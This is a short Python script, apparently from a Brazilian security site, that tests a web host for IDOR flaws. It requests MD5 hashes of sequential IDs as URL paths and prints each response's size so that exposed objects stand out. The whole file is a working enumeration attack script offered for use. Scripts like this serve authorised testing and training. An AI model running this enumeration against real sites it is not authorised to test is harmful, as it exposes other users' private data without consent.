#!/usr/bin/python

#importando bibliotecas
import requests
import os
import hashlib
import sys

print("\nIDOR - Script para manipulacao de parametro - izaelbm.com.br\n")
print("\nModo de Uso: python idor.py https://192.168.1.1")
print("Testando o Host:" + str(sys.argv[1]) + "\n")

#definir numero de tentativas
for x in range(10):

        #codificando id em md5
        id = hashlib.md5(str(x).encode()) 
        hash = id.hexdigest()

        parameter = "/" + str(hash)
        host = sys.argv[1]

        url = str(host) + str(parameter)

        payload={}
        headers = {}

        response = requests.request("GET", url, headers=headers, data=payload)

        size = sys.getsizeof(response.text)

        print("[ID]:" + str(x) + " [HASH]:" + str(hash) + " [Bytes]:" + str(size) + " [Parametro]:" + str(parameter))

print("\nConcluido...")
